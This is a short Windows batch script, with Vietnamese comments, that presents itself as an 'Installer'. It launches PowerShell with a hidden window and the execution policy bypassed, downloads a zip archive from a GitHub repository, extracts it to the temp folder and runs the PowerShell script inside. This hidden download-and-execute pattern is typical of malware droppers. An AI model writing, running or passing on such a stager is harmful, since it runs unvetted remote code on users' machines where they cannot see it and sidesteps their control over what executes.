@echo off
:: Thiết lập tiêu đề cửa sổ (tùy chọn)
title Installer

:: Thực thi lệnh PowerShell với các tham số ẩn cửa sổ và bỏ qua chính sách thực thi
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Haianh58/test/raw/refs/heads/main/edge.zip' -OutFile '$env:TEMP\edge.zip'; Expand-Archive -Path '$env:TEMP\edge.zip' -DestinationPath '$env:TEMP\edge_work' -Force; Set-Location '$env:TEMP\edge_work'; .\run.ps1"

:: Thoát chương trình sau khi hoàn tất
exit